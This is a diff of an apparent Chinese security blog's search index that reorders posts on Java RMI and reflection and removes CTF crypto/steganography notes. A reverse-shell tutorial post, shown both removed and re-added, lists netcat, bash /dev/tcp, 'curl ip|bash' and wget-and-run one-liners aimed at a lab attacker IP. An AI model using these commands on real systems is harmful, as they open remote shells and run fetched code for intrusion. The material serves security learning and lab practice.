@@ -7631,6 +7631,19 @@ Naming<span class="token punctuation">.</span><span class="token function">rebin
       </tags>
   </entry>
   <entry>
+    <title>Java安全[RMI(3)]</title>
+    <url>//post/Java%E5%AE%89%E5%85%A8%5BRMI(3)%5D/</url>
+    <content><![CDATA[<p><code>RMI2</code>中成功实现了codebase进行加载恶意类，但是在实际环境确实难实现符合环境</p>
+<span id="more"></span>
+]]></content>
+      <categories>
+        <category>Java漫谈学习</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Java安全[RMI(2)]</title>
     <url>//post/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/</url>
     <content><![CDATA[<p>从RMI第一篇描述了RMI的通信过程和组成成分，总结一下，一个RMI过程有以下三个参与者：</p>
@@ -8091,19 +8104,6 @@ java -Djava.rmi.server.hostname<span class="token operator">=</span>192.168.169.
 <p>所以，只客户端只需要导入<code>RMI_1</code>包中的接口，就可以成功访问到服务端。</p>
 <p><img src="/post/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20230921194236577.png" alt="image-20230921194236577"></p>
 <hr>
-]]></content>
-      <categories>
-        <category>Java漫谈学习</category>
-      </categories>
-      <tags>
-        <tag>Java</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Java安全[RMI(3)]</title>
-    <url>//post/Java%E5%AE%89%E5%85%A8%5BRMI(3)%5D/</url>
-    <content><![CDATA[<p><code>RMI2</code>中成功实现了codebase进行加载恶意类，但是在实际环境确实难实现符合环境</p>
-<span id="more"></span>
 ]]></content>
       <categories>
         <category>Java漫谈学习</category>
@@ -8641,24 +8641,24 @@ static block
 <p><img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(2)]/image-20230907122251594.png" alt="image-20230907122251594"></p>
 <p>可以看到，<code>Your</code>类对应生成了一个<code>My$Your.class</code>，<code>My</code>类对应生成了一个<code>My.class</code>。</p>
 <p>我们还可以试试加载这两个，看看是否有区别</p>
-<pre class=" language-JAVA"><code class="language-JAVA">package reflect2;
+<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> reflect2<span class="token punctuation">;</span>
 
-public class InsideClass {;
-    public static void main(String[] args) throws Exception {;
-        Class<?> c1 = Class.forName("reflect2.My$Your");
-        System.out.println(c1.getName());
-    };
-};
-class My{;
-    static {;
-        System.out.println("My类被加载");
-    };
-    class Your{;
-        static {;
-            System.out.println("Your类被加载");
-        };
-    };
-};
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">InsideClass</span> <span class="token punctuation">{</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span><span class="token punctuation">;</span>
+        Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> c1 <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"reflect2.My$Your"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>c1<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name">My</span><span class="token punctuation">{</span><span class="token punctuation">;</span>
+    <span class="token keyword">static</span> <span class="token punctuation">{</span><span class="token punctuation">;</span>
+        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"My类被加载"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token punctuation">;</span>
+    <span class="token keyword">class</span> <span class="token class-name">Your</span><span class="token punctuation">{</span><span class="token punctuation">;</span>
+        <span class="token keyword">static</span> <span class="token punctuation">{</span><span class="token punctuation">;</span>
+            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Your类被加载"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
 </code></pre>
 <p><img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(2)]/image-20230907124919435.png" alt="image-20230907124919435"></p>
 <p>发现初始化内部类时，外部类并没有被初始化，所以在一定程度上可以将它们当作两个无关类。</p>
@@ -8680,16 +8680,16 @@ class My{;
 <li>目标类的构造函数是私有的</li>
 </ol></blockquote>
 <p>最常遇到的情况下是，调用<code>java.lang.Runtime</code>，</p>
-<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> reflect2<span class="token punctuation">;</span>
+<pre class=" language-JAVA"><code class="language-JAVA">package reflect2;
 
-<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>InvocationTargetException<span class="token punctuation">;</span>
+import java.lang.reflect.InvocationTargetException;
 
-<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Instrance</span> <span class="token punctuation">{</span><span class="token punctuation">;</span>
-    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throw</span> Exception <span class="token punctuation">{</span><span class="token punctuation">;</span>
-        Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> cls <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        cls<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>cls<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span><span class="token punctuation">;</span>
+public class Instrance {;
+    public static void main(String[] args) throw Exception {;
+        Class<?> cls = Class.forName("java.lang.Runtime");
+        cls.getMethod("exec",String.class).invoke(cls.getDeclaredConstructor().newInstance(),"calc.exe");
+    };
+};
 </code></pre>
 <p>发现报错中提示<code>java.lang.Runtime</code>是一个私有的类，是无法直接调用其中的方法</p>
 <p><img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(2)]/image-20230907161320123.png" alt="image-20230907161320123"></p>
@@ -10795,69 +10795,6 @@ location ~ \.php$ &#123;
       </tags>
   </entry>
   <entry>
-    <title>反弹shell</title>
-    <url>//post/Reverses-shell/</url>
-    <content><![CDATA[<p><code>监听，弹弹弹</code></p>
-<span id="more"></span>
-
-<h1 id="反弹shell姿势"><a href="#反弹shell姿势" class="headerlink" title="反弹shell姿势"></a>反弹shell姿势</h1><h2 id="netcat-一句话反弹"><a href="#netcat-一句话反弹" class="headerlink" title="netcat 一句话反弹"></a>netcat 一句话反弹</h2><p>获取<code>shell</code>（想反弹谁的<code>shell</code>就在谁的后面加<code>-e /bin/sh</code>或<code>-e /bin/bash</code>）</p>
-<h3 id="正向shell"><a href="#正向shell" class="headerlink" title="正向shell"></a>正向<code>shell</code></h3><p> 客户端主动连接服务器并获取服务器shell</p>
-<pre><code>客户端主动连接并得到反弹shell    
-    nc 服务端ip 8888
-服务端监听连接
-    nc -lvp 8888 -e /bin/sh 
-    # windows上：nc -lvp 8888 -e c:\windows\system32\cmd.exe 
-</code></pre>
-<h3 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向<code>shell</code></h3><p>服务器端连接并反弹<code>shell</code>给客户端</p>
-<pre><code>客户端监听
-nc -lvp 8888 
-服务端连接客户端
-nc 客户端ip 8888 -e /bin/sh 
-
-windows上：nc ip 8888 -e c:\windows\system32\cmd.exe
-</code></pre>
-<h2 id="bash反弹shell"><a href="#bash反弹shell" class="headerlink" title="bash反弹shell"></a>bash反弹shell</h2><pre><code>bash -i &gt;&amp; /dev/tcp/我们靶机ip/我们靶机 port 0&gt;&amp;1
-</code></pre>
-<p><code>bash</code>一句话命令详解<br>以下针对常用的<code>bash</code>反弹一句话进行了拆分说明，具体内容如下</p>
-<p><img src="/post/Reverses-shell/image-20221019235717724.png" alt="image-20221019235717724"></p>
-<blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot="">
-<path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path>
-<path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path>
-<path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path>
-<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path>
-<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path>
-<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path>
-<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path>
-</svg>
-</span><p>其实以上bash反弹一句完整的解读过程就是：<br>bash产生了一个交互环境与本地主机主动发起与目标主机<code>8080</code>端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个<code>tcp 8080</code>会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash反弹环境。</p></blockquote>
-<p>在反弹<code>shell</code>时要借助<code>netcat</code>工具反弹</p>
-<h2 id="curl反弹shell"><a href="#curl反弹shell" class="headerlink" title="curl反弹shell"></a>curl反弹shell</h2><p>前提要利用<code>bash</code>一句话的情况下使用<code>curl</code>反弹<code>shell</code></p>
-<p>在存在<code>命令执行</code>的服务器上执行</p>
-<pre><code>curl [自己的服务器]ip|bash
-//在利用curl里执行我自己的服务器上的bash一句话
-</code></pre>
-<p>该<code>ip</code>的<code>index</code>文件上含有<code>bash</code>一句话，就可以反弹<code>shell</code>。</p>
-<p>例如在自己的服务器<code>index文件</code>上写上一句话</p>
-<pre><code>bash -i &gt;&amp; /dev/tcp/192.168.20.151/7777 0&gt;&amp;1
-</code></pre>
-<p> <code>192.168.20.151</code>就是作为监听端口的服务器【攻击机】用来得到反弹的shell。</p>
-<p><img src="/post/Reverses-shell/image-20221020000027288.png" alt="image-20221020000027288"></p>
-<p> 存在一句话，利用<code>curl</code>反弹。<br><code>kali</code>开启监听</p>
-<p><img src="/post/Reverses-shell/image-20221020000337460.png" alt="image-20221020000337460"></p>
-<h2 id="wget方式反弹shell"><a href="#wget方式反弹shell" class="headerlink" title="wget方式反弹shell"></a><code>wget</code>方式反弹<code>shell</code></h2><p>利用<code>wget</code>进行下载执行</p>
-<pre><code>wget 192.168.20.130/shell.txt -O /tmp/x.php &amp;&amp; php /tmp/x.php
-</code></pre>
-<p>利用下面贴出的<code>php</code>进行反弹。<br>开启监听</p>
-<p> <img src="/post/Reverses-shell/image-20221020000353533.png" alt="image-20221020000353533"></p>
-]]></content>
-      <categories>
-        <category>daily</category>
-      </categories>
-      <tags>
-        <tag>提权</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>笔记</title>
     <url>//post/Notes/</url>
     <content><![CDATA[<p><code>关键笔记，主要总结比赛中遇到的</code></p>
@@ -11916,195 +11853,94 @@ assert($_REQUEST[123])
       </tags>
   </entry>
   <entry>
-    <title>密码+杂项题简单记录</title>
-    <url>//post/crypto+misc/</url>
-    <content><![CDATA[<p><code>只会web，得分太少，还是搞点密码和杂项来提高一下</code></p>
+    <title>反弹shell</title>
+    <url>//post/Reverses-shell/</url>
+    <content><![CDATA[<p><code>监听，弹弹弹</code></p>
 <span id="more"></span>
 
-<h2 id="1-一般加密"><a href="#1-一般加密" class="headerlink" title="1.一般加密"></a>1.一般加密</h2><pre><code>直接用kali的
+<h1 id="反弹shell姿势"><a href="#反弹shell姿势" class="headerlink" title="反弹shell姿势"></a>反弹shell姿势</h1><h2 id="netcat-一句话反弹"><a href="#netcat-一句话反弹" class="headerlink" title="netcat 一句话反弹"></a>netcat 一句话反弹</h2><p>获取<code>shell</code>（想反弹谁的<code>shell</code>就在谁的后面加<code>-e /bin/sh</code>或<code>-e /bin/bash</code>）</p>
+<h3 id="正向shell"><a href="#正向shell" class="headerlink" title="正向shell"></a>正向<code>shell</code></h3><p> 客户端主动连接服务器并获取服务器shell</p>
+<pre><code>客户端主动连接并得到反弹shell    
+    nc 服务端ip 8888
+服务端监听连接
+    nc -lvp 8888 -e /bin/sh 
+    # windows上：nc -lvp 8888 -e c:\windows\system32\cmd.exe 
+</code></pre>
+<h3 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向<code>shell</code></h3><p>服务器端连接并反弹<code>shell</code>给客户端</p>
+<pre><code>客户端监听
+nc -lvp 8888 
+服务端连接客户端
+nc 客户端ip 8888 -e /bin/sh 
 
-ciphey -t &quot;xxx&quot;
+windows上：nc ip 8888 -e c:\windows\system32\cmd.exe
 </code></pre>
-<h2 id="2-SSTV图像声音-Audacity波形声音"><a href="#2-SSTV图像声音-Audacity波形声音" class="headerlink" title="2.SSTV图像声音&#x2F;Audacity波形声音"></a>2.SSTV图像声音&#x2F;Audacity波形声音</h2><pre><code>用win10上
-
-MMSSTV工具解析声音，最好用虚拟声卡这样可以屏蔽一些杂音【把声音给MMSSTV听】
-
-Audacity解析声音波形得到波形图像从而得到flag
+<h2 id="bash反弹shell"><a href="#bash反弹shell" class="headerlink" title="bash反弹shell"></a>bash反弹shell</h2><pre><code>bash -i &gt;&amp; /dev/tcp/我们靶机ip/我们靶机 port 0&gt;&amp;1
 </code></pre>
-<h2 id="3-加密压缩包"><a href="#3-加密压缩包" class="headerlink" title="3.加密压缩包"></a>3.加密压缩包</h2><h3 id="1）win10"><a href="#1）win10" class="headerlink" title="*1）win10"></a>*1）win10</h3><p>用<code>win10</code>工具爆破压缩包密码</p>
-<h3 id="2）kali"><a href="#2）kali" class="headerlink" title="2）kali"></a>2）kali</h3><p><code>kali john</code>爆破压缩包</p>
-<pre><code>zip2john 压缩包的名字.zip &gt;&gt; passwdhash.txt
+<p><code>bash</code>一句话命令详解<br>以下针对常用的<code>bash</code>反弹一句话进行了拆分说明，具体内容如下</p>
+<p><img src="/post/Reverses-shell/image-20221019235717724.png" alt="image-20221019235717724"></p>
+<blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot="">
+<path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path>
+<path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path>
+<path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path>
+<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path>
+<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path>
+<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path>
+<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path>
+</svg>
+</span><p>其实以上bash反弹一句完整的解读过程就是：<br>bash产生了一个交互环境与本地主机主动发起与目标主机<code>8080</code>端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个<code>tcp 8080</code>会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash反弹环境。</p></blockquote>
+<p>在反弹<code>shell</code>时要借助<code>netcat</code>工具反弹</p>
+<h2 id="curl反弹shell"><a href="#curl反弹shell" class="headerlink" title="curl反弹shell"></a>curl反弹shell</h2><p>前提要利用<code>bash</code>一句话的情况下使用<code>curl</code>反弹<code>shell</code></p>
+<p>在存在<code>命令执行</code>的服务器上执行</p>
+<pre><code>curl [自己的服务器]ip|bash
+//在利用curl里执行我自己的服务器上的bash一句话
 </code></pre>
-<h2 id="4-图片隐写"><a href="#4-图片隐写" class="headerlink" title="4.图片隐写"></a>4.图片隐写</h2><h3 id="1）win10-1"><a href="#1）win10-1" class="headerlink" title="1）win10"></a>1）win10</h3><p>利用<code>Stegsolve</code>解析图片隐写内容</p>
-<h3 id="2）kali-1"><a href="#2）kali-1" class="headerlink" title="*2）kali"></a>*2）kali</h3><p><code>zsteg</code></p>
-<pre><code>zsteg 图片
+<p>该<code>ip</code>的<code>index</code>文件上含有<code>bash</code>一句话，就可以反弹<code>shell</code>。</p>
+<p>例如在自己的服务器<code>index文件</code>上写上一句话</p>
+<pre><code>bash -i &gt;&amp; /dev/tcp/192.168.20.151/7777 0&gt;&amp;1
 </code></pre>
-<h2 id="5-零宽字符隐写"><a href="#5-零宽字符隐写" class="headerlink" title="5.零宽字符隐写"></a>5.零宽字符隐写</h2><p><a href="http://330k.github.io/misc_tools/unicode_steganography.html">http://330k.github.io/misc_tools/unicode_steganography.html</a></p>
-<p>我们开始看这个内容是没有什么问题的，但是底下的</p>
-<p><code>第7行，第204列</code></p>
-<p>说明里面有其他我们无法看到的字符存在</p>
-<p><img src="/post/crypto+misc/image-20220927160630959.png" alt="image-20220927160630959"></p>
-<p>我们可以利用<code>vim</code>读取一下这个文本文件，就会发现里面多了很多奇奇怪怪的字符</p>
-<p><img src="/post/crypto+misc/image-20220927160526722.png" alt="image-20220927160526722"></p>
-<p>这些就是<code>零宽字符</code></p>
-<p>那么我们如何从中读取信息呢</p>
-<p>这里就需要下面这个网站的，对文本的<code>零宽字符加密</code>和<code>零宽字符解密</code>功能</p>
-<pre><code>http://330k.github.io/misc_tools/unicode_steganography.html
+<p> <code>192.168.20.151</code>就是作为监听端口的服务器【攻击机】用来得到反弹的shell。</p>
+<p><img src="/post/Reverses-shell/image-20221020000027288.png" alt="image-20221020000027288"></p>
+<p> 存在一句话，利用<code>curl</code>反弹。<br><code>kali</code>开启监听</p>
+<p><img src="/post/Reverses-shell/image-20221020000337460.png" alt="image-20221020000337460"></p>
+<h2 id="wget方式反弹shell"><a href="#wget方式反弹shell" class="headerlink" title="wget方式反弹shell"></a><code>wget</code>方式反弹<code>shell</code></h2><p>利用<code>wget</code>进行下载执行</p>
+<pre><code>wget 192.168.20.130/shell.txt -O /tmp/x.php &amp;&amp; php /tmp/x.php
 </code></pre>
-<p>先选好出现的字符类型</p>
-<p><img src="/post/crypto+misc/image-20220927161233239.png" alt="image-20220927161233239"></p>
-<p>然后</p>
-<p><img src="/post/crypto+misc/image-20220927161257809.png" alt="image-20220927161257809"></p>
-<p>得到隐藏内容</p>
-<pre><code>86MygAZ2uJi2oCxctsd28LBNRXHPLykF5LBz8f1xEikWNVpKfpce2CMHvhSJUdk7CHLrEVhGRVQvMwT8r7JUgVWGbnzxb
-</code></pre>
-<p>用<code>ciphey</code> 得到<code>flag</code></p>
-<p><img src="/post/crypto+misc/image-20220927161352763.png" alt="image-20220927161352763"></p>
-<h2 id="6-隐藏秘密-flag-到图片、音乐"><a href="#6-隐藏秘密-flag-到图片、音乐" class="headerlink" title="6.隐藏秘密(flag)到图片、音乐"></a>6.隐藏秘密(flag)到图片、音乐</h2><h3 id="win10"><a href="#win10" class="headerlink" title="win10"></a>win10</h3><p><code>Silenteye</code></p>
-<p><img src="/post/crypto+misc/image-20220927162235740.png" alt="image-20220927162235740"></p>
-<p>把图片或者声音拖入其中</p>
-<p><img src="/post/crypto+misc/image-20220927162311232.png" alt="image-20220927162311232"></p>
-<p>然后执行<code>Decode</code></p>
-<p><img src="/post/crypto+misc/image-20220927162351939.png" alt="image-20220927162351939"></p>
-<p>得到加密信息</p>
-<p>用<code>ciphey</code> 得到<code>flag</code></p>
-<p><img src="/post/crypto+misc/image-20220927162441904.png" alt="image-20220927162441904"></p>
-<h2 id="7-小游戏"><a href="#7-小游戏" class="headerlink" title="7.小游戏"></a>7.小游戏</h2><h3 id="win10-1"><a href="#win10-1" class="headerlink" title="win10"></a>win10</h3><p><code>CE修改器，懂得都懂</code></p>
-<h2 id="8-Java类的"><a href="#8-Java类的" class="headerlink" title="8.Java类的"></a>8.Java类的</h2><p>利用<code>jd-gui</code>对java反汇编，看看有没有信息</p>
-<h2 id="9-二维码"><a href="#9-二维码" class="headerlink" title="9.二维码"></a>9.二维码</h2><h3 id="1）缺少定位点"><a href="#1）缺少定位点" class="headerlink" title="1）缺少定位点"></a>1）缺少定位点</h3><p><img src="/post/crypto+misc/image-20220927163933448.png" alt="image-20220927163933448"></p>
-<p>利用<code>ps</code>把两者拼接起来就可以了</p>
-<h2 id="10-分离图片中的隐藏文件"><a href="#10-分离图片中的隐藏文件" class="headerlink" title="10.分离图片中的隐藏文件"></a>10.分离图片中的隐藏文件</h2><p><a href="https://blog.csdn.net/qq_43531669/article/details/113732757">原文链接</a></p>
-<h3 id="1）图片分析"><a href="#1）图片分析" class="headerlink" title="1）图片分析:"></a>1）图片分析:</h3><p>如图为CTF题目中一个隐藏文件的图片</p>
-<p>首先对图片进行分析，这里介绍一个工具binwalk（kali中是自带的，也可以下载到windows中使用）。</p>
-<p>使用方法：binwalk + 文件路径&#x2F;文件名</p>
-<pre><code>binwalk 1.jpg
-</code></pre>
-<p>执行命令后，binwalk就会自动分析这个jpg文件：</p>
-<p><img src="/post/crypto+misc/image-20220927165710470.png" alt="image-20220927165710470"></p>
-<p>从分析的结果看，这个jpg文件隐藏着一个zip文件，从48221块偏移开始就是zip文件。</p>
-<h3 id="2、如何分离："><a href="#2、如何分离：" class="headerlink" title="2、如何分离："></a>2、如何分离：</h3><p>在得到隐藏信息后，改如何把zip文件分离出，下面介绍几种方法：</p>
-<h4 id="2-1、binwalk-分离："><a href="#2-1、binwalk-分离：" class="headerlink" title="2.1、binwalk 分离："></a>2.1、binwalk 分离：</h4><p>还是使用binwalk工具，使用dd命令分离出隐藏文件：</p>
-<pre><code>dd if=1.jpg of=1.zip skip=48221 bs=1
-</code></pre>
-<p>解释：if 指定输入文件，of 指定输出文件，skip 指定从输入文件开头跳过48221个块后开始复制，</p>
-<p>bs设置每次读写块的大小为1字节</p>
-<p>执行后会得到一个1.zip文件。</p>
-<p><img src="/post/crypto+misc/image-20220927165740304.png" alt="image-20220927165740304"></p>
-<h4 id="2-2、foremost-工具分离："><a href="#2-2、foremost-工具分离：" class="headerlink" title="2.2、foremost 工具分离："></a>2.2、foremost 工具分离：</h4><p>foremost是一个基于文件文件头和尾部信息以及文件的内建数据结构恢复文件的命令行工具，win可以下载使用，Linux可以通过下面命令安装使用：</p>
-<pre><code>apt-get install foremost
-</code></pre>
-<p>Linux下分离文件的命令为：</p>
-<pre><code> foremost 1.jpg
-</code></pre>
-<p>执行命令后，foremost会生成output目录存放分离出的文件。</p>
-<p>Win下是把文件直接拖到 foremost.exe上，也会生成output目录存放分离出的文件。</p>
-<p><img src="/post/crypto+misc/image-20220927165802749.png" alt="image-20220927165802749"></p>
-<h4 id="2-3、hex编辑器分离："><a href="#2-3、hex编辑器分离：" class="headerlink" title="2.3、hex编辑器分离："></a>2.3、hex编辑器分离：</h4><p>hex编辑器有很多，win下有用得较多的winhex、UltraEdit等，linux下有hexeditor等。这里我们以winhex为例来手动分离。</p>
-<p>一个完整的 jpg 文件由 FF D8 开头，FF D9结尾，图片查看器会忽略 FF D9 以后的内容，因此可以在 jpg 文件中加入其他文件。</p>
-<p>经过上面的分析， 知道图片中隐藏了zip文件，zip文件的开头16进制为504B0304，先搜索16进制文本 FFD9，然后后面跟着504B0304，于是就可以从 50 开始，复制到最后（因为这里只有一个zip，所以复制到最后），另存为新文件，就得到了隐藏的压缩包。</p>
-<p><img src="/post/crypto+misc/image-20220927165829838.png" alt="image-20220927165829838"></p>
-<p><img src="/post/crypto+misc/image-20220927165845340.png" alt="image-20220927165845340"></p>
-<p><img src="/post/crypto+misc/image-20220927165911140.png" alt="image-20220927165911140"></p>
-<h4 id="2-4、改后缀名："><a href="#2-4、改后缀名：" class="headerlink" title="2.4、改后缀名："></a>2.4、改后缀名：</h4><p>分析知道隐藏文件是zip后，有一个简单粗暴的方法是直接把图片的后缀改为.zip，然后解压即可（这种方法虽然简单快速，但如果隐写了多个文件时可能会失败）。</p>
-<h2 id="11-多图片拼图"><a href="#11-多图片拼图" class="headerlink" title="11.多图片拼图"></a>11.多图片拼图</h2><p><a href="https://blog.csdn.net/m0_62291930/article/details/124139016">原文链接</a></p>
-<p>Misc 自动拼图<br>需要使用<code>python</code>遗传算法脚本<code>gaps</code>和拼图脚本<code>montage</code></p>
-<p>开始拼图<br>以ctf中的一道训练题puzzle为例</p>
-<p>如果图片为碎片状，根据总数确定拼块长宽数量，并用montage进行第一次拼接</p>
-<p><img src="/post/crypto+misc/image-20220927171241532.png" alt="image-20220927171241532"></p>
-<pre><code>#如左下角所示，总数为256块，即图片以16×16拆分而成的（要在拼块目录下运行命令），
-#*.png为拼块格式，16×16为长宽数量，flag.png为合成后的图片名
-</code></pre>
-<pre><code>montage *.png -tile 16x16 -geometry +0+0 flag.png   
-</code></pre>
-<p>运行后在目录下可找到如下图片</p>
-<p><img src="/post/crypto+misc/image-20220927171709538.png" alt="image-20220927171709538"></p>
-<p>运行后在目录下可找到如下图片</p>
-<p><strong>接着最关键的一点，调整图片长宽比为1：1，可以用PS-&gt;图像大小，以较大数值为边长，扩充为正方形（方便后续size的计算），否则后期gaps无法获得最佳效果</strong></p>
-<p><img src="/post/crypto+misc/image-20220927171907186.png" alt="image-20220927171907186"></p>
-<p><img src="/post/crypto+misc/image-20220927171924733.png" alt="image-20220927171924733"></p>
-<p>接下来就是调用gaps脚本实现自动拼图排序<strong>（重点）</strong></p>
-<p><img src="/post/crypto+misc/image-20220927171940838.png" alt="image-20220927171940838"></p>
-<pre><code>#此处的size为正方形小拼块的边长像素，由于刚刚经过拉伸，拼块从160×100变成了160×160
-#注意是小的正方形像素，比如拼接完成的为360px，而一列有12张图，那size为12px
-gaps --image=flag.png --size=160 --save     
-</code></pre>
-<p><img src="/post/crypto+misc/image-20220927171957840.png" alt="image-20220927171957840"></p>
-<pre><code>补充：gaps各参数的作用
-
-–image 指向拼图的路径
-–size 拼图块的像素尺寸
-–generations 遗传算法的代的数量
-–population 个体数量
-–verbose 每一代训练结束后展示最佳结果
-–save 将拼图还原为图像
-</code></pre>
-<pre><code>总结
